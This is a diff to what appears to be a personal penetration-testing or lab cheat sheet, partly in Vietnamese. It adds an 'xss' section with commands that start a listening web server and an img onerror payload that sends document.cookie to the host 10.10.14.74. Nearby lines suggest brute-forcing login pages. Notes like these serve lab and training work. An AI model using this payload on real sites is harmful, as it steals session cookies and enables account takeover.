@@ -67,6 +67,14 @@ Then press Enter twice, and then enter:
 export TERM=xterm
 ```
 
+# xss
+
+```
+php -S 0.0.0.0:80
+python -m http.server 80
+<img src=1 onerror=fetch('http://10.10.14.74/'+document.cookie);/>
+```
+
 # Kinh nghiệm
 
 - login page: brute force, default account (tùy công nghệ)
